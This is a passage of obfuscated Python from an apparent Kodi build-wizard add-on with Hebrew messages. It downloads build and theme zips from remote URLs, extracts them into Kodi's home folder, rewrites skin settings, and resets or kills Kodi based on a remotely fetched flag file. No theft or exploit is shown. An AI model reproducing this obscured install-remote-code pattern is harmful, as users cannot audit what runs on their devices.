		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3876
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3877
		fixfont ()#line:3878
		O00000O0O0O00O00O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3879
		try :#line:3880
			O0O0000OO00O0O0O0 =open (O00000O0O0O00O00O ,'r')#line:3881
			O00O0O00OO00OO0OO =O0O0000OO00O0O0O0 .read ()#line:3882
			O0O0000OO00O0O0O0 .close ()#line:3883
			OO0O000O0000O0OO0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3884
			O00O0OOOO0O00O000 =re .compile (OO0O000O0000O0OO0 ).findall (O00O0O00OO00OO0OO )[0 ]#line:3885
			O0O0000OO00O0O0O0 =open (O00000O0O0O00O00O ,'w')#line:3886
			O0O0000OO00O0O0O0 .write (O00O0O00OO00OO0OO .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O00O0OOOO0O00O000 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3887
			O0O0000OO00O0O0O0 .close ()#line:3888
		except :#line:3889
				pass #line:3890
		wiz .kodi17Fix ()#line:3891
		O00000O0O0O00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3892
		try :#line:3893
			O0O0000OO00O0O0O0 =open (O00000O0O0O00O00O ,'r')#line:3894
			O00O0O00OO00OO0OO =O0O0000OO00O0O0O0 .read ()#line:3895
			O0O0000OO00O0O0O0 .close ()#line:3896
			OO0O000O0000O0OO0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3897
			O00O0OOOO0O00O000 =re .compile (OO0O000O0000O0OO0 ).findall (O00O0O00OO00OO0OO )[0 ]#line:3898
			O0O0000OO00O0O0O0 =open (O00000O0O0O00O00O ,'w')#line:3899
			O0O0000OO00O0O0O0 .write (O00O0O00OO00OO0OO .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O00O0OOOO0O00O000 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3900
			O0O0000OO00O0O0O0 .close ()#line:3901
		except :#line:3902
				pass #line:3903
		swapSkins ('skin.Premium.mod')#line:3904
def buildWizard (O0OOOO00000O00OOO ,O00O000O00000O00O ,theme =None ,over =False ):#line:3907
	if over ==False :#line:3908
		O0000OOOOOOO0O0O0 =wiz .checkBuild (O0OOOO00000O00OOO ,'url')#line:3909
		if O0000OOOOOOO0O0O0 ==False :#line:3911
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3916
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3917
			return #line:3918
		OO00O0O0O0OO00OOO =wiz .workingURL (O0000OOOOOOO0O0O0 )#line:3919
		if OO00O0O0O0OO00OOO ==False :#line:3920
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO00O0O0O0OO00OOO ))#line:3921
			return #line:3922
	if O00O000O00000O00O =='gui':#line:3923
		if O0OOOO00000O00OOO ==BUILDNAME :#line:3924
			if over ==True :OO00OO0O0000OO0OO =1 #line:3925
			else :OO00OO0O0000OO0OO =1 #line:3926
		else :#line:3927
			OO00OO0O0000OO0OO =1 #line:3928
		if OO00OO0O0000OO0OO :#line:3929
			remove_addons ()#line:3930
			remove_addons2 ()#line:3931
			OOOO0000OOOOO0000 =wiz .checkBuild (O0OOOO00000O00OOO ,'gui')#line:3932
			OOO0OO00O00OOOOOO =O0OOOO00000O00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3933
			if not wiz .workingURL (OOOO0000OOOOO0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3934
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3935
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO00000O00OOO ),'','אנא המתן')#line:3936
			O000OOOO0OO0O00O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0OO00O00OOOOOO )#line:3937
			try :os .remove (O000OOOO0OO0O00O0 )#line:3938
			except :pass #line:3939
			logging .warning (OOOO0000OOOOO0000 )#line:3940
			if 'google'in OOOO0000OOOOO0000 :#line:3941
			   OOOOOO0O00OO0O000 =googledrive_download (OOOO0000OOOOO0000 ,O000OOOO0OO0O00O0 ,DP ,wiz .checkBuild (O0OOOO00000O00OOO ,'filesize'))#line:3942
			else :#line:3945
			  downloader .download (OOOO0000OOOOO0000 ,O000OOOO0OO0O00O0 ,DP )#line:3946
			xbmc .sleep (100 )#line:3947
			O0O0O0OOO0O00O00O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO00000O00OOO )#line:3948
			DP .update (0 ,O0O0O0OOO0O00O00O ,'','אנא המתן')#line:3949
			extract .all (O000OOOO0OO0O00O0 ,HOME ,DP ,title =O0O0O0OOO0O00O00O )#line:3950
			DP .close ()#line:3951
			wiz .defaultSkin ()#line:3952
			wiz .lookandFeelData ('save')#line:3953
			wiz .kodi17Fix ()#line:3954
			if KODIV >=18 :#line:3955
				skindialogsettind18 ()#line:3956
			if INSTALLMETHOD ==1 :OOOOO0O0OOOOOO0OO =1 #line:3958
			elif INSTALLMETHOD ==2 :OOOOO0O0OOOOOO0OO =0 #line:3959
			else :DP .close ()#line:3960
			O0OOOOO0OOO0OOOO0 =(NOTIFICATION )#line:3961
			OOO0OO0OO0OOO0O0O =urllib2 .urlopen (O0OOOOO0OOO0OOOO0 )#line:3962
			O0OO00000OO000O00 =OOO0OO0OO0OOO0O0O .readlines ()#line:3963
			OOO0OOO0O000OOO0O =0 #line:3964
			for OOO0O0O0000OO0O0O in O0OO00000OO000O00 :#line:3967
				if OOO0O0O0000OO0O0O .split (' ==')[0 ]=="noreset"or OOO0O0O0000OO0O0O .split ()[0 ]=="noreset":#line:3968
					xbmc .executebuiltin ("ReloadSkin()")#line:3970
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3971
					update_Votes ()#line:3972
					indicatorfastupdate ()#line:3973
				if OOO0O0O0000OO0O0O .split (' ==')[0 ]=="reset"or OOO0O0O0000OO0O0O .split ()[0 ]=="reset":#line:3974
					update_Votes ()#line:3976
					indicatorfastupdate ()#line:3977
					resetkodi ()#line:3978
		else :#line:3987
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3988
	if O00O000O00000O00O =='gui2':#line:3989
		if O0OOOO00000O00OOO ==BUILDNAME :#line:3990
			if over ==True :OO00OO0O0000OO0OO =1 #line:3991
			else :OO00OO0O0000OO0OO =1 #line:3992
		else :#line:3993
			OO00OO0O0000OO0OO =1 #line:3994
		if OO00OO0O0000OO0OO :#line:3995
			remove_addons ()#line:3996
			remove_addons2 ()#line:3997
			OOOO0000OOOOO0000 =wiz .checkBuild (O0OOOO00000O00OOO ,'gui')#line:3998
			OOO0OO00O00OOOOOO =O0OOOO00000O00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3999
			if not wiz .workingURL (OOOO0000OOOOO0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4000
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4001
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO00000O00OOO ),'','אנא המתן')#line:4002
			O000OOOO0OO0O00O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0OO00O00OOOOOO )#line:4003
			try :os .remove (O000OOOO0OO0O00O0 )#line:4004
			except :pass #line:4005
			logging .warning (OOOO0000OOOOO0000 )#line:4006
			if 'google'in OOOO0000OOOOO0000 :#line:4007
			   OOOOOO0O00OO0O000 =googledrive_download (OOOO0000OOOOO0000 ,O000OOOO0OO0O00O0 ,DP ,wiz .checkBuild (O0OOOO00000O00OOO ,'filesize'))#line:4008
			else :#line:4011
			  downloader .download (OOOO0000OOOOO0000 ,O000OOOO0OO0O00O0 ,DP )#line:4012
			xbmc .sleep (100 )#line:4013
			O0O0O0OOO0O00O00O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO00000O00OOO )#line:4014
			DP .update (0 ,O0O0O0OOO0O00O00O ,'','אנא המתן')#line:4015
			extract .all (O000OOOO0OO0O00O0 ,HOME ,DP ,title =O0O0O0OOO0O00O00O )#line:4016
			DP .close ()#line:4017
			wiz .defaultSkin ()#line:4018
			wiz .lookandFeelData ('save')#line:4019
			if INSTALLMETHOD ==1 :OOOOO0O0OOOOOO0OO =1 #line:4022
			elif INSTALLMETHOD ==2 :OOOOO0O0OOOOOO0OO =0 #line:4023
			else :DP .close ()#line:4024
		else :#line:4026
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4027
	elif O00O000O00000O00O =='fresh':#line:4028
		freshStart (O0OOOO00000O00OOO )#line:4029
	elif O00O000O00000O00O =='normal':#line:4030
		if url =='normal':#line:4031
			if KEEPTRAKT =='true':#line:4032
				traktit .autoUpdate ('all')#line:4033
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4034
			if KEEPREAL =='true':#line:4035
				debridit .autoUpdate ('all')#line:4036
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4037
			if KEEPLOGIN =='true':#line:4038
				loginit .autoUpdate ('all')#line:4039
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4040
		OOO0O0O0000O0O0O0 =int (KODIV );O00OOOOOOOO0OOO0O =int (float (wiz .checkBuild (O0OOOO00000O00OOO ,'kodi')))#line:4041
		if not OOO0O0O0000O0O0O0 ==O00OOOOOOOO0OOO0O :#line:4042
			if OOO0O0O0000O0O0O0 ==16 and O00OOOOOOOO0OOO0O <=15 :O00O0OO000OO00O0O =False #line:4043
			else :O00O0OO000OO00O0O =True #line:4044
		else :O00O0OO000OO00O0O =False #line:4045
		if O00O0OO000OO00O0O ==True :#line:4046
			O00OO00000OOO0OOO =1 #line:4047
		else :#line:4048
			if not over ==False :O00OO00000OOO0OOO =1 #line:4049
			else :O00OO00000OOO0OOO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4050
		if O00OO00000OOO0OOO :#line:4051
			wiz .clearS ('build')#line:4052
			OOOO0000OOOOO0000 =wiz .checkBuild (O0OOOO00000O00OOO ,'url')#line:4053
			OOO0OO00O00OOOOOO =O0OOOO00000O00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4054
			if not wiz .workingURL (OOOO0000OOOOO0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4055
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4056
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,O0OOOO00000O00OOO ,wiz .checkBuild (O0OOOO00000O00OOO ,'version')),'','אנא המתן')#line:4057
			O000OOOO0OO0O00O0 =os .path .join (PACKAGES ,'%s.zip'%OOO0OO00O00OOOOOO )#line:4058
			try :os .remove (O000OOOO0OO0O00O0 )#line:4059
			except :pass #line:4060
			logging .warning (OOOO0000OOOOO0000 )#line:4061
			if 'google'in OOOO0000OOOOO0000 :#line:4062
			   OOOOOO0O00OO0O000 =googledrive_download (OOOO0000OOOOO0000 ,O000OOOO0OO0O00O0 ,DP ,wiz .checkBuild (O0OOOO00000O00OOO ,'filesize'))#line:4063
			else :#line:4066
			  downloader .download (OOOO0000OOOOO0000 ,O000OOOO0OO0O00O0 ,DP )#line:4067
			xbmc .sleep (1000 )#line:4068
			O0O0O0OOO0O00O00O ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO00000O00OOO ,wiz .checkBuild (O0OOOO00000O00OOO ,'version'))#line:4069
			DP .update (0 ,O0O0O0OOO0O00O00O ,'','אנא המתן...')#line:4070
			O0O0OOO000O00O0O0 ,O0O00OO000OOOO0O0 ,OOOO0O0O0O0OO0OOO =extract .all (O000OOOO0OO0O00O0 ,HOME ,DP ,title =O0O0O0OOO0O00O00O )#line:4071
			if int (float (O0O0OOO000O00O0O0 ))>0 :#line:4072
				try :#line:4073
					wiz .fixmetas ()#line:4074
				except :pass #line:4075
				wiz .lookandFeelData ('save')#line:4076
				wiz .defaultSkin ()#line:4077
				wiz .setS ('buildname',O0OOOO00000O00OOO )#line:4079
				wiz .setS ('buildversion',wiz .checkBuild (O0OOOO00000O00OOO ,'version'))#line:4080
				wiz .setS ('buildtheme','')#line:4081
				wiz .setS ('latestversion',wiz .checkBuild (O0OOOO00000O00OOO ,'version'))#line:4082
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4083
				wiz .setS ('installed','true')#line:4084
				wiz .setS ('extract',str (O0O0OOO000O00O0O0 ))#line:4085
				wiz .setS ('errors',str (O0O00OO000OOOO0O0 ))#line:4086
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0O0OOO000O00O0O0 ,O0O00OO000OOOO0O0 ))#line:4087
				fastupdatefirstbuild (NOTEID )#line:4088
				wiz .kodi17Fix ()#line:4089
				skin_homeselect ()#line:4090
				skin_lower ()#line:4091
				rdbuildinstall ()#line:4092
				try :gaiaserenaddon ()#line:4093
				except :pass #line:4094
				adults18 ()#line:4095
				skinfix18 ()#line:4096
				try :os .remove (O000OOOO0OO0O00O0 )#line:4098
				except :pass #line:4099
				O00OO0OO00O00OO0O =(ADDON .getSetting ("auto_rd"))#line:4100
				if O00OO0OO00O00OO0O =='true':#line:4101
					try :#line:4102
						setautorealdebrid ()#line:4103
					except :pass #line:4104
				try :#line:4105
					autotrakt ()#line:4106
				except :pass #line:4107
				O0O0O00O0OO000OO0 =(ADDON .getSetting ("imdb_on"))#line:4108
				if O0O0O00O0OO000OO0 =='true':#line:4109
					imdb_synck ()#line:4110
				iptvset ()#line:4111
				DP .close ()#line:4119
				OOOOOOO000O0O000O =wiz .themeCount (O0OOOO00000O00OOO )#line:4120
				builde_Votes ()#line:4121
				indicator ()#line:4122
				if not OOOOOOO000O0O000O ==False :#line:4123
					buildWizard (O0OOOO00000O00OOO ,'theme')#line:4124
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4125
				if INSTALLMETHOD ==1 :OOOOO0O0OOOOOO0OO =1 #line:4126
				elif INSTALLMETHOD ==2 :OOOOO0O0OOOOOO0OO =0 #line:4127
				else :resetkodi ()#line:4128
				if OOOOO0O0OOOOOO0OO ==1 :wiz .reloadFix ()#line:4130
				else :wiz .killxbmc (True )#line:4131
			else :#line:4132
				if isinstance (O0O00OO000OOOO0O0 ,unicode ):#line:4133
					OOOO0O0O0O0OO0OOO =OOOO0O0O0O0OO0OOO .encode ('utf-8')#line:4134
				OO00O00OOOO0OOO0O =open (O000OOOO0OO0O00O0 ,'r')#line:4135
				OO0OO00OOOO000OO0 =OO00O00OOOO0OOO0O .read ()#line:4136
				O000OO0OOOOO00OOO =''#line:4137
				for OO0000O00O00O0O0O in OOOOOO0O00OO0O000 :#line:4138
				  O000OO0OOOOO00OOO ='key: '+O000OO0OOOOO00OOO +'\n'+OO0000O00O00O0O0O #line:4139
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OOOO0O0O0O0OO0OOO +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O000OO0OOOOO00OOO )#line:4140
		else :#line:4141
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4142
	elif O00O000O00000O00O =='theme':#line:4143
		if theme ==None :#line:4144
			OOOOOOO000O0O000O =wiz .checkBuild (O0OOOO00000O00OOO ,'theme')#line:4145
			OO0OOO00O000O0OOO =[]#line:4146
			if not OOOOOOO000O0O000O =='http://'and wiz .workingURL (OOOOOOO000O0O000O )==True :#line:4147
				OO0OOO00O000O0OOO =wiz .themeCount (O0OOOO00000O00OOO ,False )#line:4148
				if len (OO0OOO00O000O0OOO )>0 :#line:4149
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O0OOOO00000O00OOO ,COLOR1 ,len (OO0OOO00O000O0OOO )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4150
						wiz .log ("Theme List: %s "%str (OO0OOO00O000O0OOO ))#line:4151
						OOOO00O00OOO0000O =DIALOG .select (ADDONTITLE ,OO0OOO00O000O0OOO )#line:4152
						wiz .log ("Theme install selected: %s"%OOOO00O00OOO0000O )#line:4153
						if not OOOO00O00OOO0000O ==-1 :theme =OO0OOO00O000O0OOO [OOOO00O00OOO0000O ];OO00000OOO00OO00O =True #line:4154
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4155
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4156
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4157
		else :OO00000OOO00OO00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O0OOOO00000O00OOO ,wiz .checkBuild (O0OOOO00000O00OOO ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4158
		if OO00000OOO00OO00O :#line:4159
			OOOOO00OO000O0O00 =wiz .checkTheme (O0OOOO00000O00OOO ,theme ,'url')#line:4160
			OOO0OO00O00OOOOOO =O0OOOO00000O00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4161
			if not wiz .workingURL (OOOOO00OO000O0O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4162
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4163
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4164
			O000OOOO0OO0O00O0 =os .path .join (PACKAGES ,'%s.zip'%OOO0OO00O00OOOOOO )#line:4165
			try :os .remove (O000OOOO0OO0O00O0 )#line:4166
			except :pass #line:4167
			downloader .download (OOOOO00OO000O0O00 ,O000OOOO0OO0O00O0 ,DP )#line:4168
			xbmc .sleep (1000 )#line:4169
			DP .update (0 ,"","Installing %s "%O0OOOO00000O00OOO )#line:4170
			OOO0OO000000O00O0 =False #line:4171
			if url not in ["fresh","normal"]:#line:4172
				OOO0OO000000O00O0 =testTheme (O000OOOO0OO0O00O0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4173
				O0O0OO0O0O0OOO0O0 =testGui (O000OOOO0OO0O00O0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4174
				if OOO0OO000000O00O0 ==True :#line:4175
					wiz .lookandFeelData ('save')#line:4176
					OO0O0O00OO0O0O0OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4177
					OOO00O0OO0000O0OO =xbmc .getSkinDir ()#line:4178
					skinSwitch .swapSkins (OO0O0O00OO0O0O0OO )#line:4180
					O0OO00000OO000O00 =0 #line:4181
					xbmc .sleep (1000 )#line:4182
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OO00000OO000O00 <150 :#line:4183
						O0OO00000OO000O00 +=1 #line:4184
						xbmc .sleep (1000 )#line:4185
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4186
						wiz .ebi ('SendClick(11)')#line:4187
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4188
					xbmc .sleep (1000 )#line:4189
			O0O0O0OOO0O00O00O ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4190
			DP .update (0 ,O0O0O0OOO0O00O00O ,'','אנא המתן')#line:4191
			O0O0OOO000O00O0O0 ,O0O00OO000OOOO0O0 ,OOOO0O0O0O0OO0OOO =extract .all (O000OOOO0OO0O00O0 ,HOME ,DP ,title =O0O0O0OOO0O00O00O )#line:4192
			wiz .setS ('buildtheme',theme )#line:4193
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0O0OOO000O00O0O0 ,O0O00OO000OOOO0O0 ))#line:4194
			DP .close ()#line:4195
			if url not in ["fresh","normal"]:#line:4196
				wiz .forceUpdate ()#line:4197
				if KODIV >=17 :wiz .kodi17Fix ()#line:4198
				if O0O0OO0O0O0OOO0O0 ==True :#line:4199
					wiz .lookandFeelData ('save')#line:4200
					wiz .defaultSkin ()#line:4201
					OOO00O0OO0000O0OO =wiz .getS ('defaultskin')#line:4202
					skinSwitch .swapSkins (OOO00O0OO0000O0OO )#line:4203
					O0OO00000OO000O00 =0 #line:4204
					xbmc .sleep (1000 )#line:4205
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OO00000OO000O00 <150 :#line:4206
						O0OO00000OO000O00 +=1 #line:4207
						xbmc .sleep (1000 )#line:4208
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4210
						wiz .ebi ('SendClick(11)')#line:4211
					wiz .lookandFeelData ('restore')#line:4212
				elif OOO0OO000000O00O0 ==True :#line:4213
					skinSwitch .swapSkins (OOO00O0OO0000O0OO )#line:4214
					O0OO00000OO000O00 =0 #line:4215
					xbmc .sleep (1000 )#line:4216
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OO00000OO000O00 <150 :#line:4217
						O0OO00000OO000O00 +=1 #line:4218
						xbmc .sleep (1000 )#line:4219
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4221
						wiz .ebi ('SendClick(11)')#line:4222
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4223
					wiz .lookandFeelData ('restore')#line:4224
				else :#line:4225
					wiz .ebi ("ReloadSkin()")#line:4226
					xbmc .sleep (1000 )#line:4227
					wiz .ebi ("Container.Refresh")#line:4228
		else :#line:4229
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4230
def skin_homeselect ():#line:4234
	try :#line:4236
		O0OOOO0OO0OO00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4237
		OOO00OOO00OOO0O0O =open (O0OOOO0OO0OO00OO0 ,'r')#line:4239
		O0OO0000O0000000O =OOO00OOO00OOO0O0O .read ()#line:4240
		OOO00OOO00OOO0O0O .close ()#line:4241
		O000O0O0OOO00000O ='<setting id="HomeS" type="string(.+?)/setting>'#line:4242
		O0OO00OOO0OO000O0 =re .compile (O000O0O0OOO00000O ).findall (O0OO0000O0000000O )[0 ]#line:4243
		OOO00OOO00OOO0O0O =open (O0OOOO0OO0OO00OO0 ,'w')#line:4244
		OOO00OOO00OOO0O0O .write (O0OO0000O0000000O .replace ('<setting id="HomeS" type="string%s/setting>'%O0OO00OOO0OO000O0 ,'<setting id="HomeS" type="string"></setting>'))#line:4245
		OOO00OOO00OOO0O0O .close ()#line:4246
	except :#line:4247
		pass #line:4248
def skin_lower ():#line:4251
	OO00OO00OOOO0OOOO =(ADDON .getSetting ("lower"))#line:4252
	if OO00OO00OOOO0OOOO =='true':#line:4253
		try :#line:4256
			O0000OO0000O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4257
			OO0O00OOOO0O00O00 =open (O0000OO0000O00000 ,'r')#line:4259
			O00O0OO000OOO000O =OO0O00OOOO0O00O00 .read ()#line:4260
			OO0O00OOOO0O00O00 .close ()#line:4261
			O000O0O00O00OO0O0 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4262
			O0OOOO0OOO000O0O0 =re .compile (O000O0O00O00OO0O0 ).findall (O00O0OO000OOO000O )[0 ]#line:4263
			OO0O00OOOO0O00O00 =open (O0000OO0000O00000 ,'w')#line:4264
			OO0O00OOOO0O00O00 .write (O00O0OO000OOO000O .replace ('<setting id="none_widget" type="bool%s/setting>'%O0OOOO0OOO000O0O0 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4265
			OO0O00OOOO0O00O00 .close ()#line:4266
			O0000OO0000O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4268
			OO0O00OOOO0O00O00 =open (O0000OO0000O00000 ,'r')#line:4270
			O00O0OO000OOO000O =OO0O00OOOO0O00O00 .read ()#line:4271
			OO0O00OOOO0O00O00 .close ()#line:4272
			O000O0O00O00OO0O0 ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4273
			O0OOOO0OOO000O0O0 =re .compile (O000O0O00O00OO0O0 ).findall (O00O0OO000OOO000O )[0 ]#line:4274
			OO0O00OOOO0O00O00 =open (O0000OO0000O00000 ,'w')#line:4275
			OO0O00OOOO0O00O00 .write (O00O0OO000OOO000O .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O0OOOO0OOO000O0O0 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4276
			OO0O00OOOO0O00O00 .close ()#line:4277
			O0000OO0000O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4279
			OO0O00OOOO0O00O00 =open (O0000OO0000O00000 ,'r')#line:4281
			O00O0OO000OOO000O =OO0O00OOOO0O00O00 .read ()#line:4282
			OO0O00OOOO0O00O00 .close ()#line:4283
			O000O0O00O00OO0O0 ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4284
			O0OOOO0OOO000O0O0 =re .compile (O000O0O00O00OO0O0 ).findall (O00O0OO000OOO000O )[0 ]#line:4285
			OO0O00OOOO0O00O00 =open (O0000OO0000O00000 ,'w')#line:4286
			OO0O00OOOO0O00O00 .write (O00O0OO000OOO000O .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O0OOOO0OOO000O0O0 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4287
			OO0O00OOOO0O00O00 .close ()#line:4288
			O0000OO0000O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4292
